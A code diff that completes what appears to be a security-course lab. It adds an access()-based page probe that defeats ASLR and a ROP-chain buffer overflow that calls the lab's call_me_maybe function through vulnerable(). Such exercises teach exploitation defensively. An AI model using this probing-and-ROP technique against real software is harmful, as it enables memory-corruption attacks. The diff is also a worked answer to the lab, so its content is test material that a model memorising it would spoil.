@@ -17,7 +17,6 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <stdbool.h>
-#include <x86intrin.h>
 #include "lab.h"
 
 // Same as in Part 2
@@ -28,10 +27,26 @@ extern void call_me_maybe(uint64_t rdi, uint64_t rsi, uint64_t rdx);
 uint64_t find_address(uint64_t low_bound, uint64_t high_bound);
 void do_overflow(uint64_t page_addr);
 
-uint64_t find_address(uint64_t low_bound, uint64_t high_bound) {
+static bool is_candidate_page(uint64_t addr) {
+    errno = 0;
 
-    // Put your Part 1 code here
-    // You are free to choose any of 1A, 1B, or 1C
+    if (access((const char *)addr, F_OK) == 0) {
+        return true;
+    }
+
+    return errno != EFAULT;
+}
+
+uint64_t find_address(uint64_t low_bound, uint64_t high_bound) {
+    if (low_bound >= high_bound) {
+        return 0;
+    }
+
+    for (uint64_t addr = low_bound; addr < high_bound; addr += PAGE_SIZE) {
+        if (is_candidate_page(addr)) {
+            return addr;
+        }
+    }
 
     return 0;
 }
@@ -41,10 +56,36 @@ uint64_t find_address(uint64_t low_bound, uint64_t high_bound) {
  * Construct the ROP chain and execute it using the gadgets we found by breaking ASLR.
  */
 void do_overflow(uint64_t page_addr) {
+    uint64_t your_string[128];
+    uint64_t gadget1_addr = page_addr + 0x00;
+    uint64_t gadget2_addr = page_addr + 0x10;
+    uint64_t gadget3_addr = page_addr + 0x20;
+    uint64_t gadget4_addr = page_addr + 0x30;
+    uint64_t gadget5_addr = page_addr + 0x40;
+    uint64_t gadget6_addr = page_addr + 0x50;
+    uint64_t call_me_maybe_addr = (uint64_t)&call_me_maybe;
 
-    // Put your Part 2 code here
-    // Use the page you found with find_address
-    // and the offsets located from objdump to find your gadgets
+    memset(your_string, 0xFF, sizeof(your_string));
+    your_string[127] = 0x000000000000000A;
+
+    your_string[0] = 0xFFFFFFFFFFFFFFFF;
+    your_string[1] = 0xFFFFFFFFFFFFFFFF;
+    your_string[2] = 0xFFFFFFFFFFFFFFFF;
+    your_string[3] = gadget3_addr;
+    your_string[4] = gadget5_addr;
+    your_string[5] = gadget5_addr;
+    your_string[6] = gadget5_addr;
+    your_string[7] = gadget5_addr;
+    your_string[8] = gadget6_addr;
+    your_string[9] = gadget2_addr;
+    your_string[10] = gadget2_addr;
+    your_string[11] = gadget2_addr;
+    your_string[12] = gadget1_addr;
+    your_string[13] = 13371337;
+    your_string[14] = gadget4_addr;
+    your_string[15] = call_me_maybe_addr;
+
+    vulnerable((char *)your_string);
 
 }
 
